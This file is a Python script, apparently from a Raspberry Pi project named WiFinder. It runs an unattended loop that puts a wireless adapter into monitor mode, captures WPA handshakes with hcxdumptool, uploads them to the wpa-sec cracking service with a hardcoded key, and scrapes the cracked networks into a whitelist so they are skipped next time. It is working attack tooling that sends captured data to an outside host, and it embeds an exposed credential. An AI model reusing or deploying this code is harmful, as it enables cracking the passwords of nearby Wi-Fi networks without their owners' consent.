import subprocess
import time
import requests
import json
import os
from bs4 import BeautifulSoup


def get_interface():  # Sets the Ralink wireless adapter in moditor mode using airmon-ng
    get_adapter = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_adapter, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')
    print(interface)

    set_monitor = "airmon-ng start " + interface
    p = subprocess.Popen(set_monitor, stdin=subprocess.PIPE, shell=True)
    p.communicate(input=b'y')
    time.sleep(2)

    get_monitor_interface = """airmon-ng | awk '{ if ($4 == "Ralink") print $2 }' """
    p = subprocess.Popen(get_monitor_interface, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    interface = output.decode('utf-8').replace('\n', '')
    return interface


def send_location():
    get_mac_address = """cat /sys/class/net/eth0/address"""
    p = subprocess.Popen(get_mac_address, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    mac_address = output.decode('utf-8')
    params = {'mac': mac_address, 'location': '0, 0'}
    requests.get(url='IPADDRESS:8080/location', params=params)

    return 0


interface = get_interface()

while True:
    # Checks device status
    status_file = open("/home/rumen/WiFinder/rpi_setup/status", "r")
    status = status_file.read()
    status_file.close()
    if status == '0':
        time.sleep(2)
        continue
    elif status == '3':
        time.sleep(2)
        continue

    # Removes leftover capture
    if os.path.exists("/root/rumen/WiFinder/rpi_setup/capture.cap"):
        os.remove("/home/rumen/WiFinder/rpi_setup/capture.cap")

    hcxCommand = "sudo hcxdumptool -i" + interface + " -o /home/rumen/WiFinder/rpi_setup/capture.cap" \
                                                     "--filterlist=/home/rumen/WiFinder/rpi_setup/whitelist.txt " \
                                                     "--filtermode=1 "

    # Captures handshakes for a period of 1 minute
    process = subprocess.Popen(hcxCommand.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    time.sleep(60)
    process.kill()
    time.sleep(5)
    os.remove("/home/rumen/WiFinder/rpi_setup/whitelist.txt")

    # Sends the capture to wpa-sec
    cookie = {'key': '7fcb3ff5176fb532124b5ac3e4616a04'}
    file = '/home/rumen/WiFinder/rpi_setup/capture.cap'
    url = 'https://wpa-sec.stanev.org/?submit'
    files = {'file': open(file, 'rb')}

    r = requests.post(url, files=files, cookies=cookie)
    # print(r.content)

    # Gets recently uploaded networks and adds them to a whitelist
    url = 'https://wpa-sec.stanev.org/?my_nets'
    r = requests.get(url, cookies=cookie)
    soup = BeautifulSoup(r.text, features="html.parser")
    table = soup.find_all('table')
    table_data = [[cell.text for cell in row("td")]
                  for row in table]

    table_data = table_data[0]
    data = [table_data[x:x+6] for x in range(0, len(table_data), 6)]
    whitelist = open("/home/rumen/WiFinder/rpi_setup/whitelist.txt", "a+")

    result = json.loads(json.dumps(data))
    for network in result:
        whitelist.write(network[0])
        whitelist.write('\n')

    whitelist.close()
